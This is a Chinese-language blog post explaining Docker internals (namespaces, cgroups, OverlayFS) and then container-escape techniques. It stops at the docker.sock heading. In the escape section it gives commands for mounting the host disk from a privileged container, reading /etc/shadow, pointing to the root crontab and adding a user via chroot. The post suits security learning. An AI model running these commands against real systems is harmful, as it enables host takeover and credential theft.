<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Docker-escape - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
äº‘ğŸ˜¶â€ğŸŒ«ï¸
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="Docker-escape" />
<meta property="og:description" content="
äº‘ğŸ˜¶â€ğŸŒ«ï¸
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/docker-escape/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-03-06T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-03-06T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Docker-escape"/>
<meta name="twitter:description" content="
äº‘ğŸ˜¶â€ğŸŒ«ï¸
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">Docker-escape</h1>
			<div class="meta">Posted on Mar 6, 2024</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>äº‘ğŸ˜¶â€ğŸŒ«ï¸</p>
</blockquote>
<p>OCIï¼ˆOpen Container Initiativeï¼‰è§„èŒƒæ˜¯äº‹å®ä¸Šçš„å®¹å™¨æ ‡å‡†ï¼Œå·²ç»è¢«å¤§éƒ¨åˆ†å®¹å™¨å®ç°ä»¥åŠå®¹å™¨ç¼–æ’ç³»ç»Ÿæ‰€é‡‡ç”¨ï¼ŒåŒ…æ‹¬ Docker å’Œ Kubernetesã€‚</p>
<p>ä» OCI è§„èŒƒå¼€å§‹äº†è§£å®¹å™¨é•œåƒï¼Œå¯ä»¥è®©æˆ‘ä»¬å¯¹å®¹å™¨æŠ€æœ¯å»ºç«‹æ›´å…¨é¢æ¸…æ™°çš„è®¤çŸ¥ï¼Œè€Œä¸æ˜¯å›¿äºå®ç°ç»†èŠ‚ã€‚OCI è§„èŒƒåˆ†ä¸ºÂ <code>Image spec</code>Â å’ŒÂ <code>Runtime spec</code>Â ä¸¤éƒ¨åˆ†ï¼Œå®ƒä»¬åˆ†åˆ«è¦†ç›–äº†å®¹å™¨ç”Ÿå‘½å‘¨æœŸçš„ä¸åŒé˜¶æ®µ</p>
<h2 id="dockeræ ¸å¿ƒåŸç†">Dockeræ ¸å¿ƒåŸç†</h2>
<p>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäºÂ <a href="https://www.runoob.com/go/go-tutorial.html">Go è¯­è¨€</a>Â å¹¶éµä» Apache2.0 åè®®å¼€æºã€‚</p>
<p>Dockerçš„å®ç°ä¾èµ–äºLinuxä¸­ä¼—å¤šçš„åŸºç¡€æœºåˆ¶ï¼ŒåŒ…æ‹¬ç”¨äºèµ„æºé™åˆ¶çš„cgroupï¼Œç”¨äºéš”ç¦»çš„Namespaceï¼Œä»¥åŠç”¨äºå®ç°dockeræ–‡ä»¶ç³»ç»Ÿçš„Union FSç­‰ã€‚</p>
<h3 id="namespace">namespace</h3>
<p>èµ„æºéš”ç¦»</p>
<p>Linuxçš„ namespace å¯ä»¥å®ç°èµ„æºèƒ½å¤Ÿåœ¨ä¸åŒçš„å‘½åç©ºé—´é‡Œæœ‰ç›¸åŒçš„åç§°ï¼Œè­¬å¦‚åœ¨Â <code>Aå‘½åç©ºé—´</code>Â æœ‰ä¸ªpidä¸º1çš„è¿›ç¨‹ï¼Œè€Œåœ¨Â <code>Bå‘½åç©ºé—´</code>Â ä¸­ä¹Ÿå¯ä»¥æœ‰ä¸€ä¸ªpidä¸º1çš„è¿›ç¨‹ã€‚</p>
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/nsproxy.h#L31">nsproxy.h</a>ï¼Œ7ç§namespaceï¼Œå¯¹äºæ¯ä¸ªä»»åŠ¡ <code>task_struct</code> éƒ½å­˜åœ¨ä¸€ä¸ªnsproxy æˆå‘˜</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * A structure to contain pointers to all per-process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * namespaces - fs (mount), uts, network, sysvipc, etc.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> *
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * The pid namespace is an exception -- it&#39;s accessed using
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * task_active_pid_ns.  The pid namespace here is the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * namespace that children will use.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> *
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * &#39;count&#39; is the number of tasks holding a reference.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * The count for each namespace, then, will be the number
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * of nsproxies pointing to it, not the number of tasks.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> *
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * The nsproxy is shared by tasks which share all namespaces.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * As soon as a single namespace is cloned or unshared, the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * nsproxy is copied.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">nsproxy</span> {
</span></span><span style="display:flex;"><span>	refcount_t count;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">uts_namespace</span> <span style="color:#ff79c6">*</span>uts_ns;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">ipc_namespace</span> <span style="color:#ff79c6">*</span>ipc_ns;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">mnt_namespace</span> <span style="color:#ff79c6">*</span>mnt_ns;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pid_namespace</span> <span style="color:#ff79c6">*</span>pid_ns_for_children;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">net</span> 	     <span style="color:#ff79c6">*</span>net_ns;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">time_namespace</span> <span style="color:#ff79c6">*</span>time_ns;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">time_namespace</span> <span style="color:#ff79c6">*</span>time_ns_for_children;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">cgroup_namespace</span> <span style="color:#ff79c6">*</span>cgroup_ns;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>namespaceä¹Ÿæ˜¯linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå°†å†…æ ¸èµ„æºåˆ†éš”å¼€ï¼Œä¸€ç»„è¿›ç¨‹èƒ½çœ‹åˆ°ä¸€äº›èµ„æºï¼Œè€Œå…¶ä»–ç»„çš„è¿›ç¨‹çœ‹åˆ°çš„æ˜¯ä¸åŒçš„èµ„æºï¼Œç»„ä¸ç»„ä¹‹é—´äº’ä¸å¹²æ‰°ï¼Œä¸çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ã€‚ç®€å•æ¥è¯´ï¼Œnamespaceå°±æ˜¯å†…æ ¸æä¾›çš„ä¸€ç§è¿›ç¨‹é—´èµ„æºéš”ç¦»æŠ€æœ¯ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ubuntu@ubuntu:~$ ls -al /proc/self/ns
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>dr-x--x--x <span style="color:#bd93f9">2</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 .
</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#bd93f9">9</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 cgroup -&gt; <span style="color:#f1fa8c">&#39;cgroup:[4026531835]&#39;</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 ipc -&gt; <span style="color:#f1fa8c">&#39;ipc:[4026531839]&#39;</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 mnt -&gt; <span style="color:#f1fa8c">&#39;mnt:[4026531841]&#39;</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 net -&gt; <span style="color:#f1fa8c">&#39;net:[4026531840]&#39;</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 pid -&gt; <span style="color:#f1fa8c">&#39;pid:[4026531836]&#39;</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 pid_for_children -&gt; <span style="color:#f1fa8c">&#39;pid:[4026531836]&#39;</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 <span style="color:#8be9fd;font-style:italic">time</span> -&gt; <span style="color:#f1fa8c">&#39;time:[4026531834]&#39;</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 time_for_children -&gt; <span style="color:#f1fa8c">&#39;time:[4026531834]&#39;</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 user -&gt; <span style="color:#f1fa8c">&#39;user:[4026531837]&#39;</span>
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 uts -&gt; <span style="color:#f1fa8c">&#39;uts:[4026531838]&#39;</span>
</span></span></code></pre></div><p>ä¸å…¶æœ‰å…³çš„ç³»ç»Ÿè°ƒç”¨</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># æœ‰ä¸ªunshareçš„å‘½ä»¤ï¼Œéœ€è¦åŒºåˆ†ä¸€ä¸‹</span>
</span></span><span style="display:flex;"><span>$ man <span style="color:#bd93f9">2</span> unshare
</span></span><span style="display:flex;"><span>$ man clone
</span></span></code></pre></div><p>unshareåˆ›å»ºå‘½åç©ºé—´</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>:/ <span style="color:#6272a4"># readlink /proc/$$/ns/uts </span>
</span></span><span style="display:flex;"><span>uts:<span style="color:#ff79c6">[</span>4026531838<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>:/ <span style="color:#6272a4"># unshare --uts /bin/bash</span>
</span></span><span style="display:flex;"><span>:/ <span style="color:#6272a4"># readlink /proc/$$/ns/uts </span>
</span></span><span style="display:flex;"><span>uts:<span style="color:#ff79c6">[</span>4026532690<span style="color:#ff79c6">]</span>
</span></span></code></pre></div><h3 id="cgroup">cgroup</h3>
<p>èµ„æºé™åˆ¶</p>
<p>cgroupï¼ˆcontrol groupï¼‰æ˜¯linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå¯ä»¥ç”¨äºé™åˆ¶ã€è®¡ç®—ã€éš”ç¦»è¿›ç¨‹ç»„å¯¹è®¡ç®—æœºèµ„æºçš„ä½¿ç”¨ï¼ˆå¦‚CPUã€memoryã€disk I/Oã€networkç­‰ï¼‰ã€‚</p>
<p>cgroupæœ‰å¦‚ä¸‹å››ä¸ªåŠŸèƒ½ï¼š</p>
<ol>
<li>èµ„æºé™åˆ¶ï¼ˆResource limitsï¼‰ï¼šé™åˆ¶è¿›ç¨‹ç»„å¯¹æŸä¸€ç‰¹å®šèµ„æºï¼ˆCPUï¼Œdiskï¼Œæˆ–networkï¼‰çš„ä½¿ç”¨é‡</li>
<li>ä¼˜å…ˆçº§ï¼ˆPrioritizationï¼‰ï¼šé€šè¿‡ç»™æŸä¸ªcgroupä¸­çš„è¿›ç¨‹åˆ†é…å¤šä¸€äº›èµ„æºï¼ˆç›¸æ¯”äºå…¶ä»–cgroupï¼‰ï¼Œä»è€Œæé«˜ä¼˜å…ˆçº§</li>
<li>å®¡è®¡ï¼ˆAccountingï¼‰ï¼šè®°å½•è¿›ç¨‹/è¿›ç¨‹ç»„ä½¿ç”¨çš„èµ„æºé‡</li>
<li>æ§åˆ¶ï¼ˆControlï¼‰ï¼šè¿›ç¨‹ç»„æ§åˆ¶ï¼Œå¦‚å¯ä»¥ä½¿ç”¨freezerå°†è¿›ç¨‹ç»„æŒ‚èµ·æˆ–æ¢å¤</li>
</ol>
<p>cgroupæ˜¯å®¹å™¨ï¼ˆcontainersï¼‰çš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå› ä¸ºå®¹å™¨ä¸­é€šå¸¸ä¼šè¿è¡Œå¤šä¸ªè¿›ç¨‹ï¼Œè¿™äº›è¿›ç¨‹é€šå¸¸éœ€è¦ä¸€å¹¶æ§åˆ¶ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /proc/self/cgroup
</span></span><span style="display:flex;"><span>0::/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-4f943e0d-c769-40ec-92df-ca2643d86752.scope
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ ls -al /sys/fs/cgroup		<span style="color:#6272a4"># æŸ¥çœ‹cgroupæ–‡ä»¶ç³»ç»Ÿï¼Œç›®å½•ä¸‹æ¯ä¸ªç›®å½•ä»£è¡¨ä¸€ä¸ªcgroupç±»å‹ã€‚æ¯ä¸€ä¸ªcgroupç±»éƒ½éµå¾ªå±‚çº§ç»“æ„</span>
</span></span></code></pre></div><h3 id="union-fs">Union FS</h3>
<p>Union File System ï¼Œç®€ç§° UnionFSï¼Œ<strong>æŠŠå…¶ä»–æ–‡ä»¶ç³»ç»Ÿè”åˆåˆ°ä¸€ä¸ªè”åˆæŒ‚è½½ç‚¹çš„æ–‡ä»¶ç³»ç»ŸæœåŠ¡</strong>ï¼Œç›®çš„æ˜¯<strong>å°†å¤šä¸ªæ–‡ä»¶è”åˆåœ¨ä¸€èµ·æˆä¸ºä¸€ä¸ªç»Ÿä¸€çš„è§†å›¾</strong></p>
<p>å®ƒçš„æ€æƒ³æ˜¯ï¼Œå¦‚æœä¸€ä¸ªèµ„æºæ˜¯é‡å¤çš„ï¼Œä½†æ²¡æœ‰ä»»ä½•ä¿®æ”¹ï¼Œè¿™æ—¶å€™å¹¶ä¸éœ€è¦ç«‹å³åˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºï¼Œè¿™ä¸ªèµ„æºå¯ä»¥è¢«æ–°æ—§å®ä¾‹å…±äº«ã€‚</p>
<p>åˆ›å»ºæ–°èµ„æºå‘ç”Ÿåœ¨ç¬¬ä¸€æ¬¡å†™æ“ä½œï¼Œä¹Ÿå°±æ˜¯å¯¹èµ„æºè¿›è¡Œä¿®æ”¹çš„æ—¶å€™ã€‚é€šè¿‡è¿™ç§èµ„æºå…±äº«çš„æ–¹å¼ï¼Œå¯ä»¥æ˜¾è‘—åœ°å‡å°‘æœªä¿®æ”¹èµ„æºå¤åˆ¶å¸¦æ¥çš„æ¶ˆè€—ï¼Œä½†æ˜¯ä¹Ÿä¼šåœ¨è¿›è¡Œèµ„æºä¿®æ”¹çš„æ—¶å€™å¢å‡å°éƒ¨åˆ†çš„å¼€é”€ã€‚</p>
<p>OverlayFSï¼šOverlayfs æ˜¯ä¸€ç§å †å æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä¾èµ–å¹¶å»ºç«‹åœ¨å…¶å®ƒçš„æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šï¼ˆä¾‹å¦‚ ext4fs å’Œ xfs ç­‰ç­‰ï¼‰ï¼Œå¹¶ä¸ç›´æ¥å‚ä¸ç£ç›˜ç©ºé—´ç»“æ„çš„åˆ’åˆ†ï¼Œä»…ä»…å°†åŸæ¥åº•å±‚æ–‡ä»¶ç³»ç»Ÿä¸­ä¸åŒçš„ç›®å½•è¿›è¡Œâ€œåˆå¹¶â€ï¼Œç„¶åå‘ç”¨æˆ·å‘ˆç°ã€‚<a href="https://zhuanlan.zhihu.com/p/679328995">OverlayFS</a></p>
<h3 id="more">MORE</h3>
<p>å¦‚æœè§‰å¾—ä¸æ˜ç™½ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„Docker</p>
<ul>
<li><a href="https://www.infoq.com/articles/build-a-container-golang/">Build Your Own Container Using Less than 100 Lines of Go</a></li>
<li><a href="https://www.wolai.com/curry00/rjPry5XyA6BLYyUoEaDWDm">æ‰‹å†™docker</a></li>
</ul>
<h2 id="dockeré€ƒé€¸">Dockeré€ƒé€¸</h2>
<h3 id="æ£€æµ‹dockerç¯å¢ƒ">æ£€æµ‹Dockerç¯å¢ƒ</h3>
<ul>
<li>æ£€æŸ¥æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨<code>.dockerenv</code>æ–‡ä»¶</li>
<li>æ£€æŸ¥Â <code>/proc/1/cgroup</code>Â æ˜¯å¦å­˜åœ¨å«æœ‰dockerå­—ç¬¦ä¸²!</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@06fcbcd12128:/# ls -al /
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">60</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">4096</span> Mar  <span style="color:#bd93f9">6</span> 01:52 .
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">4096</span> Mar  <span style="color:#bd93f9">6</span> 01:52 ..
</span></span><span style="display:flex;"><span>-rwxr-xr-x   <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 01:52 .dockerenv
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ???</span>
</span></span><span style="display:flex;"><span>root@06fcbcd12128:/# cat /proc/1/cgroup
</span></span><span style="display:flex;"><span>0::/
</span></span></code></pre></div><h3 id="docker-å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®">Docker å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®</h3>
<p>å¦‚æœè®¾å®šäº†ä»¥ä¸‹é…ç½®å°±ä¼šå¯¼è‡´ç›¸åº”çš„éš”ç¦»æœºåˆ¶å¤±æ•ˆï¼š</p>
<ul>
<li>&ndash;privilegedï¼šä½¿å®¹å™¨å†…çš„ root æƒé™å’Œå®¿ä¸»æœºä¸Šçš„ root æƒé™ä¸€è‡´ï¼Œæƒé™éš”ç¦»è¢«æ‰“ç ´</li>
<li>&ndash;net=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€ç½‘ç»œå‘½åç©ºé—´ï¼Œç½‘ç»œéš”ç¦»è¢«æ‰“ç ´</li>
<li>&ndash;pid=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€è¿›ç¨‹å‘½ä»¤ç©ºé—´ï¼Œè¿›ç¨‹éš”ç¦»è¢«æ‰“ç ´</li>
<li>&ndash;volume /:/hostï¼šå®¿ä¸»æœºæ ¹ç›®å½•è¢«æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œæ–‡ä»¶ç³»ç»Ÿéš”ç¦»è¢«æ‰“ç ´</li>
</ul>
<p>å½“æ“ä½œè€…æ‰§è¡Œ<code>docker run --privileged</code>æ—¶ï¼ŒDockerå°†å…è®¸å®¹å™¨è®¿é—®å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼Œä½¿å®¹å™¨æ‹¥æœ‰ä¸é‚£äº›ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹å‡ ä¹ç›¸åŒçš„è®¿é—®æƒé™ã€‚å¯ä»¥é€šè¿‡å†™sshå¯†é’¥ã€è®¡åˆ’ä»»åŠ¡ç­‰æ–¹å¼è¾¾åˆ°é€ƒé€¸ã€‚</p>
<p>åˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æƒæ¨¡å¼ï¼šCapEff ä¸»è¦æ˜¯æ£€æŸ¥çº¿ç¨‹çš„æ‰§è¡Œæƒé™ã€‚å¦‚æœæ˜¯ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„è¯ï¼ŒCapEff å¯¹åº”çš„æ©ç å€¼åº”è¯¥ä¸º0000003fffffffff æˆ–è€…æ˜¯ 0000001fffffffff <a href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html">(1)</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># ç‰¹æƒçº§ä¸‹</span>
</span></span><span style="display:flex;"><span>bash-4.4# cat /proc/1/status | grep Cap
</span></span><span style="display:flex;"><span>CapInh: <span style="color:#bd93f9">0000000000000000</span>
</span></span><span style="display:flex;"><span>CapPrm: 0000003fffffffff
</span></span><span style="display:flex;"><span>CapEff: 0000003fffffffff
</span></span><span style="display:flex;"><span>CapBnd: 0000003fffffffff
</span></span><span style="display:flex;"><span>CapAmb: <span style="color:#bd93f9">0000000000000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># éç‰¹æƒçº§ä¸‹</span>
</span></span><span style="display:flex;"><span>root@a8a2a8be5ee4:/# cat /proc/1/status | grep Cap
</span></span><span style="display:flex;"><span>CapInh:	<span style="color:#bd93f9">0000000000000000</span>
</span></span><span style="display:flex;"><span>CapPrm:	00000000a80425fb
</span></span><span style="display:flex;"><span>CapEff:	00000000a80425fb
</span></span><span style="display:flex;"><span>CapBnd:	00000000a80425fb
</span></span><span style="display:flex;"><span>CapAmb:	<span style="color:#bd93f9">0000000000000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ubuntu@ubuntu:~$ capsh --decode<span style="color:#ff79c6">=</span>0000003fffffffff
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">0x0000003fffffffff</span><span style="color:#ff79c6">=</span>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
</span></span></code></pre></div><p>æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œé€ƒé€¸</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># æŸ¥çœ‹ç£ç›˜æ–‡ä»¶</span>
</span></span><span style="display:flex;"><span>fdisk -l
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># æŒ‚è½½</span>
</span></span><span style="display:flex;"><span>mkdir -p hacker
</span></span><span style="display:flex;"><span>mount /dev/sda1 /hacker
</span></span><span style="display:flex;"><span>cat /hacker/etc/shadow
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># å®šæ—¶ä»»åŠ¡</span>
</span></span><span style="display:flex;"><span>/hacker/var/spool/cron/crontabs/root
</span></span></code></pre></div><p>ä¹Ÿå¯ä»¥æ·»åŠ æ–°çš„ç”¨æˆ·è¿›è¡Œç™»å½•</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mount /dev/sda1 /mnt
</span></span><span style="display:flex;"><span>chroot /mnt adduser john
</span></span></code></pre></div><h3 id="dockerå±é™©æŒ‚è½½">Dockerå±é™©æŒ‚è½½</h3>
<h4 id="dockersock">docker.sock</h4>
<p>docker.sockæ˜¯<strong>Dockerå®ˆæŠ¤è¿›ç¨‹(Docker daemon)<strong>é»˜è®¤ç›‘å¬çš„</strong>UnixåŸŸå¥—æ¥å­—(Unix domain socket)</strong>ï¼Œå®¹å™¨ä¸­çš„è¿›ç¨‹å¯ä»¥é€šè¿‡å®ƒä¸Dockerå®ˆæŠ¤è¿›ç¨‹è¿›è¡Œé€šä¿¡ã€‚</p>
<p>docker.sockæŒ‚è½½</p>
